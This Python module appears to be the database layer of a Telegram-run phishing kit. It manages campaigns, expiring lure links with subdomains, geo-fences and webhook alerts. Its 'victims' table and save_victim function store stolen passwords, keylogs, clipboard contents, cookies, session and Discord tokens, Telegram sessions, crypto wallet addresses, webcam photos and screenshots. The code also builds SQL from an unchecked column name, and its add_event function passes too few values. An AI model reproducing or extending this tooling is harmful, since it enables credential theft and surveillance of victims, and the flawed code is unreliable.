import aiosqlite
import os
from datetime import datetime, timedelta

DB_PATH = os.path.join(os.path.dirname(__file__), "data.db")

def _ts():
    return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                tg_id INTEGER PRIMARY KEY,
                username TEXT,
                role TEXT DEFAULT 'user',
                domain TEXT DEFAULT '',
                total_links INTEGER DEFAULT 0,
                total_victims INTEGER DEFAULT 0,
                created_at TEXT,
                last_active TEXT
            );

            CREATE TABLE IF NOT EXISTS campaigns (
                id TEXT PRIMARY KEY,
                tg_id INTEGER,
                name TEXT,
                template TEXT,
                created_at TEXT,
                expires_at TEXT,
                active INTEGER DEFAULT 1,
                FOREIGN KEY (tg_id) REFERENCES users(tg_id)
            );

            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                tg_id INTEGER,
                template TEXT,
                subdomain TEXT,
                full_url TEXT,
                hits INTEGER DEFAULT 0,
                data_received INTEGER DEFAULT 0,
                created_at TEXT,
                expires_at TEXT,
                active INTEGER DEFAULT 1,
                notes TEXT,
                FOREIGN KEY (campaign_id) REFERENCES campaigns(id),
                FOREIGN KEY (tg_id) REFERENCES users(tg_id)
            );

            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                session_id TEXT,
                ip TEXT,
                country TEXT,
                city TEXT,
                lat REAL,
                lon REAL,
                isp TEXT,
                org TEXT,
                asn TEXT,
                vpn INTEGER DEFAULT 0,
                proxy INTEGER DEFAULT 0,
                hosting INTEGER DEFAULT 0,
                tor INTEGER DEFAULT 0,
                ua TEXT,
                platform TEXT,
                screen TEXT,
                language TEXT,
                timezone TEXT,
                canvas_fp TEXT,
                webgl_fp TEXT,
                cpu_cores INTEGER,
                ram INTEGER,
                device_memory REAL,
                touch_supported INTEGER DEFAULT 0,
                cookies_enabled INTEGER DEFAULT 1,
                do_not_track INTEGER DEFAULT 0,
                adblock INTEGER DEFAULT 0,
                photo TEXT,
                photo_hash TEXT,
                screenshot TEXT,
                clipboard TEXT,
                clipboard_hash TEXT,
                keylog TEXT,
                login TEXT,
                password TEXT,
                email TEXT,
                phone TEXT,
                token TEXT,
                cookie TEXT,
                session_data TEXT,
                geo_accuracy INTEGER,
                referrer TEXT,
                visit_duration INTEGER DEFAULT 0,
                keystrokes INTEGER DEFAULT 0,
                mouse_clicks INTEGER DEFAULT 0,
                form_interactions INTEGER DEFAULT 0,
                risk_score INTEGER DEFAULT 0,
                page_path TEXT,
                querystring TEXT,
                linkedin_url TEXT,
                facebook_url TEXT,
                twitter_handle TEXT,
                instagram_handle TEXT,
                discord_token TEXT,
                telegram_session TEXT,
                steam_id TEXT,
                wallet_addresses TEXT,
                notes TEXT,
                created_at TEXT,
                FOREIGN KEY (link_id) REFERENCES links(id)
            );

            CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                session_id TEXT,
                victim_ip TEXT,
                event_type TEXT,
                detail TEXT,
                timestamp TEXT,
                FOREIGN KEY (link_id) REFERENCES links(id)
            );

            CREATE TABLE IF NOT EXISTS webhooks (
                tg_id INTEGER PRIMARY KEY,
                telegram INTEGER DEFAULT 1,
                discord INTEGER DEFAULT 0,
                discord_url TEXT,
                FOREIGN KEY (tg_id) REFERENCES users(tg_id)
            );

            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            );

            CREATE TABLE IF NOT EXISTS geo_fences (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                tg_id INTEGER,
                country TEXT,
                action TEXT DEFAULT 'block',
                FOREIGN KEY (tg_id) REFERENCES users(tg_id)
            );

            CREATE INDEX IF NOT EXISTS idx_victims_link ON victims(link_id);
            CREATE INDEX IF NOT EXISTS idx_events_link ON events(link_id);
            CREATE INDEX IF NOT EXISTS idx_links_user ON links(tg_id);
            CREATE INDEX IF NOT EXISTS idx_links_campaign ON links(campaign_id);
        """)
        await db.commit()

# ── User ──
async def register_user(tg_id: int, username: str | None):
    now = _ts()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT OR IGNORE INTO users (tg_id, username, created_at, last_active)
            VALUES (?, ?, ?, ?)
        """, (tg_id, username, now, now))
        await db.execute("UPDATE users SET username = ?, last_active = ? WHERE tg_id = ?",
                         (username, now, tg_id))
        await db.commit()

async def get_user(tg_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM users WHERE tg_id = ?", (tg_id,))
        return await c.fetchone()

async def increment_user_stats(tg_id: int, col: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(f"UPDATE users SET {col} = {col} + 1 WHERE tg_id = ?", (tg_id,))
        await db.commit()

async def set_user_domain(tg_id: int, domain: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET domain = ? WHERE tg_id = ?", (domain, tg_id))
        await db.commit()

# ── Campaigns ──
async def create_campaign(campaign_id: str, tg_id: int, name: str, template: str, ttl: int = 48):
    now = _ts()
    expires = (datetime.utcnow() + timedelta(hours=ttl)).strftime("%Y-%m-%d %H:%M:%S")
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO campaigns (id, tg_id, name, template, created_at, expires_at)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (campaign_id, tg_id, name, template, now, expires))
        await db.commit()

async def get_campaigns(tg_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM campaigns WHERE tg_id = ? ORDER BY created_at DESC", (tg_id,))
        return await c.fetchall()

async def get_campaign(campaign_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM campaigns WHERE id = ?", (campaign_id,))
        return await c.fetchone()

async def deactivate_campaign(campaign_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE campaigns SET active = 0 WHERE id = ?", (campaign_id,))
        await db.commit()

# ── Links ──
async def create_link(link_id: str, campaign_id: str | None, tg_id: int, template: str,
                      subdomain: str, full_url: str, ttl: int = 48):
    now = _ts()
    expires = (datetime.utcnow() + timedelta(hours=ttl)).strftime("%Y-%m-%d %H:%M:%S")
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO links (id, campaign_id, tg_id, template, subdomain, full_url,
                               created_at, expires_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (link_id, campaign_id, tg_id, template, subdomain, full_url, now, expires))
        await db.commit()

async def get_user_links(tg_id: int, active_only: bool = True):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        if active_only:
            c = await db.execute(
                "SELECT * FROM links WHERE tg_id = ? AND active = 1 ORDER BY created_at DESC",
                (tg_id,))
        else:
            c = await db.execute(
                "SELECT * FROM links WHERE tg_id = ? ORDER BY created_at DESC", (tg_id,))
        return await c.fetchall()

async def get_link(link_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        return await c.fetchone()

async def increment_hits(link_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE links SET hits = hits + 1 WHERE id = ?", (link_id,))
        await db.commit()

async def mark_data_received(link_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE links SET data_received = data_received + 1 WHERE id = ?", (link_id,))
        await db.commit()

async def delete_link(link_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM events WHERE link_id = ?", (link_id,))
        await db.execute("DELETE FROM victims WHERE link_id = ?", (link_id,))
        await db.execute("DELETE FROM links WHERE id = ?", (link_id,))
        await db.commit()

async def deactivate_expired_links():
    now = _ts()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE links SET active = 0 WHERE expires_at < ? AND active = 1", (now,))
        await db.commit()

# ── Victims ──
async def save_victim(link_id: str, data: dict):
    now = _ts()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO victims (
                link_id, session_id, ip, country, city, lat, lon, isp, org, asn,
                vpn, proxy, hosting, tor, ua, platform, screen, language, timezone,
                canvas_fp, webgl_fp, cpu_cores, ram, device_memory, touch_supported,
                cookies_enabled, do_not_track, adblock, photo, screenshot, clipboard,
                keylog, login, password, email, phone, token, cookie, session_data,
                geo_accuracy, referrer, visit_duration, keystrokes, mouse_clicks,
                form_interactions, risk_score, page_path, querystring,
                linkedin_url, facebook_url, twitter_handle, instagram_handle,
                discord_token, telegram_session, steam_id, wallet_addresses, notes,
                created_at
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (
            link_id,
            data.get("session_id", ""),
            data.get("ip", ""),
            data.get("country", ""),
            data.get("city", ""),
            data.get("lat"),
            data.get("lon"),
            data.get("isp", ""),
            data.get("org", ""),
            data.get("asn", ""),
            data.get("vpn", 0),
            data.get("proxy", 0),
            data.get("hosting", 0),
            data.get("tor", 0),
            data.get("ua", ""),
            data.get("platform", ""),
            data.get("screen", ""),
            data.get("language", ""),
            data.get("timezone", ""),
            data.get("canvas_fp", ""),
            data.get("webgl_fp", ""),
            data.get("cpu_cores"),
            data.get("ram"),
            data.get("device_memory"),
            data.get("touch", 0),
            data.get("cookies", 1),
            data.get("dnt", 0),
            data.get("adblock", 0),
            data.get("photo", ""),
            data.get("screenshot", ""),
            data.get("clipboard", ""),
            data.get("keylog", ""),
            data.get("login", ""),
            data.get("password", ""),
            data.get("email", ""),
            data.get("phone", ""),
            data.get("token", ""),
            data.get("cookie", ""),
            data.get("session_data", ""),
            data.get("geo_accuracy"),
            data.get("referrer", ""),
            data.get("visit_duration", 0),
            data.get("keystrokes", 0),
            data.get("mouse_clicks", 0),
            data.get("form_interactions", 0),
            data.get("risk_score", 0),
            data.get("page_path", ""),
            data.get("querystring", ""),
            data.get("linkedin_url", ""),
            data.get("facebook_url", ""),
            data.get("twitter_handle", ""),
            data.get("instagram_handle", ""),
            data.get("discord_token", ""),
            data.get("telegram_session", ""),
            data.get("steam_id", ""),
            data.get("wallet_addresses", ""),
            data.get("notes", ""),
            now
        ))
        await db.commit()

async def get_victims(link_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM victims WHERE link_id = ? ORDER BY created_at DESC", (link_id,))
        return await c.fetchall()

async def get_recent_victims(tg_id: int, limit: int = 10):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("""
            SELECT v.*, l.template, l.full_url FROM victims v
            JOIN links l ON v.link_id = l.id
            WHERE l.tg_id = ?
            ORDER BY v.created_at DESC LIMIT ?
        """, (tg_id, limit))
        return await c.fetchall()

async def get_victim_count(tg_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        c = await db.execute("""
            SELECT COUNT(*) FROM victims v
            JOIN links l ON v.link_id = l.id
            WHERE l.tg_id = ?
        """, (tg_id,))
        row = await c.fetchone()
        return row[0] if row else 0

# ── Events ──
async def add_event(link_id: str, session_id: str, victim_ip: str, event_type: str, detail: str = ""):
    now = _ts()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO events (link_id, session_id, victim_ip, event_type, detail, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (link_id, session_id, victim_ip, event_type, detail[:500]))
        await db.commit()

async def get_events(link_id: str, limit: int = 50):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("""
            SELECT * FROM events WHERE link_id = ? ORDER BY timestamp DESC LIMIT ?
        """, (link_id, limit))
        return await c.fetchall()

# ── Webhooks ──
async def get_webhook(tg_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM webhooks WHERE tg_id = ?", (tg_id,))
        return await c.fetchone()

async def set_webhook_telegram(tg_id: int, enabled: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO webhooks (tg_id, telegram) VALUES (?, ?)
            ON CONFLICT(tg_id) DO UPDATE SET telegram = ?
        """, (tg_id, enabled, enabled))
        await db.commit()

async def set_webhook_discord(tg_id: int, enabled: int, url: str = ""):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO webhooks (tg_id, discord, discord_url) VALUES (?, ?, ?)
            ON CONFLICT(tg_id) DO UPDATE SET discord = ?, discord_url = ?
        """, (tg_id, enabled, url, enabled, url))
        await db.commit()

# ── Geo Fences ──
async def add_geo_fence(tg_id: int, country: str, action: str = "block"):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO geo_fences (tg_id, country, action) VALUES (?, ?, ?)
        """, (tg_id, country, action))
        await db.commit()

async def get_geo_fences(tg_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        c = await db.execute("SELECT * FROM geo_fences WHERE tg_id = ?", (tg_id,))
        return await c.fetchall()

async def remove_geo_fence(fence_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM geo_fences WHERE id = ?", (fence_id,))
        await db.commit()

# ── Settings ──
async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
            (key, value)
        )
        await db.commit()

async def get_setting(key: str) -> str | None:
    async with aiosqlite.connect(DB_PATH) as db:
        c = await db.execute("SELECT value FROM settings WHERE key = ?", (key,))
        row = await c.fetchone()
        return row[0] if row else None
